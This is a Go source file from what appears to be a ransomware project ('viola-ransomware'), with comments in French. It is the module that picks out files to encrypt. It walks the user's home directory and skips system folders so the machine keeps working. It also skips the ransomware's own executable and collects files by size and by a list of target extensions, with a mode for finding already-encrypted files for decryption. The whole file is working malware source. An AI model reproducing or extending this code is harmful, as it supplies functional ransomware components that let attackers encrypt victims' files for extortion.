package enumeration

import (
	"os"
	"path/filepath"
	"strings"
	"viola-ransomware/config"
)

// Liste de dossiers à ne JAMAIS toucher pour éviter de rendre le système instable
var excludedFolders = []string{
	"AppData", "Local Settings", "Windows", "Program Files", 
	"ProgramData", "Library", "System", "bin", "boot",
}

// DirectoryEnumeration parcourt le dossier personnel intelligemment.
func DirectoryEnumeration(decrypt bool) ([]string, error) {
	var files []string

	// 1. Récupération du point de départ (Home Directory)
	homeDir, err := os.UserHomeDir()
	if err != nil {
		return nil, err
	}

	// 2. Identification de l'exécutable actuel pour s'exclure soi-même
	selfPath, _ := os.Executable()

	// 3. Définition des extensions cibles
	targetExt := config.ExtForEncrypt
	if decrypt {
		targetExt = []string{config.ChangedToExtensions}
	}

	sizeLimit := int64(config.MaxSize) * 1024 * 1024

	// 4. Parcours récursif optimisé
	err = filepath.Walk(homeDir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil // Ignorer les dossiers sans accès (Permission denied)
		}

		// Ignorer les dossiers critiques
		if info.IsDir() {
			for _, excluded := range excludedFolders {
				if strings.Contains(path, excluded) {
					return filepath.SkipDir
				}
			}
			return nil
		}

		// Vérification de l'exécutable pour ne pas s'auto-chiffrer
		if path == selfPath {
			return nil
		}

		// Vérification de la taille (Performance)
		if info.Size() > sizeLimit || info.Size() == 0 {
			return nil
		}

		// Vérification de l'extension
		ext := filepath.Ext(path)
		if isTargetExtension(ext, targetExt) {
			files = append(files, path)
		}

		return nil
	})

	return files, err
}

// isTargetExtension vérifie si l'extension fait partie de la liste cible
func isTargetExtension(ext string, targetList []string) bool {
	for _, t := range targetList {
		if strings.EqualFold(ext, t) { // Case-insensitive
			return true
		}
	}
	return false
}